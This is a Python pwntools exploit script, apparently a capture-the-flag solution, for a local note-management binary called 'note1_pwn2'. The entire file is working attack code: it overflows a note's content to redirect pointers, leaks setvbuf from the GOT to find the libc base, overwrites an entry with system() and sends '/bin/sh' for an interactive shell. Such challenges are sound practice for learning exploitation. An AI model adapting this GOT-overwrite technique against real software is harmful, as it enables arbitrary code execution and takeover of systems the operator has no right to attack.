#!/usr/bin/python
# -*- coding: <encoding name> -*-

from pwn import *
import time,sys,binascii

elf_name = "./note1_pwn2"
elf = ELF(elf_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = process(elf_name)
gdb.attach(io, "b *0x4008D0")
setvbuf_offset = libc.symbols["setvbuf"]
system_offset = libc.symbols["system"]
print "setvbuf_offset is , " ,hex(setvbuf_offset)
print "system_offset is , " ,hex(system_offset)

def new(title, type1, content):
    io.recvuntil('option--->>')
    io.sendline(str(1))
    io.recvuntil('Enter the title:')
    io.sendline(title)
    io.recvuntil('Enter the type:')
    io.sendline(type1)
    io.recvuntil('Enter the content:')
    io.sendline(content)

def show():
    io.recvuntil('option--->>')
    io.sendline(str(2))

def edit(title, content):
    io.recvuntil('option--->>')
    io.sendline(str(3))
    io.recvuntil('Input the note title:')
    io.sendline(title)
    io.recvuntil('Enter the new content:')
    io.sendline(content)

def delete(title, content):
    io.recvuntil('option--->>')
    io.sendline(str(4))
    io.recvuntil('Input the note title:')
    io.sendline(title)

def main():
    new('AAAA','haha','hahaha')
    new('BBBB','haha','hahaha')
    new('CCCC','haha','hahaha')

    payload = cyclic(272)+p64(0x6020b0) + p64(0x601ff0)
    edit("AAAA",payload)
    show()
    print io.recvuntil('content=hahaha')
    print io.recvuntil('content=hahaha')
    data = io.recvuntil('1.New note')
    print data

    title = data.split(', type')[0].split('title=')[1]
    print 'title',title,'len',len(title)
    content = data.split('content=')[1].split('\n')[0]
    print 'content',content,'len',len(content)
    libc_base = u64(content.ljust(8,'\x00')) - setvbuf_offset
    print 'libc_base',hex(libc_base)
    system = libc_base+system_offset

    payload = 'a' * 8 + p64(system)
    edit(title, payload)
    io.recvuntil('option--->>')
    io.sendline("/bin/sh")
    io.interactive()

if __name__ == '__main__':
    main()
